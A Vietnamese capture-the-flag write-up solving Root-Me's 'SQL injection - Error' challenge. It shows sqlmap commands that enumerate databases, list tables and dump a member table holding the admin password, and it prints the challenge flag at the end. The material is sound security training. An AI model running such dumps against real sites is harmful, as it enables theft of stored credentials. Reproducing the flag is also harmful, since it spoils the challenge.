
# Write up challenge SQL injection - Error

Tác giả:
- **Nguyễn Mỹ Quỳnh** <br>

  
[Link Challenge](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)<br>

Truy cập challenge ta thấy gồm 2 trang Authentication | Contents

<img src="./img/1.png" alt="normal_acc_TRAbID"/> 

<br> Sau khi test bằng cách nhập `'` vào cuối url trang Contents em thấy rằng lỗi SQL injection 
 xuất hiện tại đây

<img src="./img/2.png" alt="normal_acc_TRAbID"/> 

Tiến hành sử dụng sqlmap với url này. Option -u chỉ định url cần khai thác, --dbs là để lấy dữ liệu database.

`sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs`

<img src="./img/03.png" alt="normal_acc_TRAbID"/>
<img src="./img/3.png" alt="normal_acc_TRAbID"/>

<br>

Trong các databasse tìm được, cần chú ý public. Thử tiếp tục khai thác. Gõ lệnh: (--tables lấy tên bảng trong database được chỉ định bởi option -D)

`sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables`

<img src="./img/04.png" alt="normal_acc_TRAbID"/>
<img src="./img/4.png" alt="normal_acc_TRAbID"/>

Tiếp tục khai thác các bảng tìm được. Option -T chỉ định bảng cần lấy data, --dump để lấy toàn bộ data của bảng này:

`sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump`

<img src="./img/05.png" alt="normal_acc_TRAbID"/>
<img src="./img/5.png" alt="normal_acc_TRAbID"/>

Có được passadmin tiến hành xác thực tại trang Authentication thì nhận được thông báo flag là pass admin.

<img src="./img/6.png" alt="normal_acc_TRAbID"/>

Submit thành công 

<img src="./img/7.png" alt="normal_acc_TRAbID"/>

<br><br>

> **Flag:** 1a2BdKT5DIx3qxQN3UaC
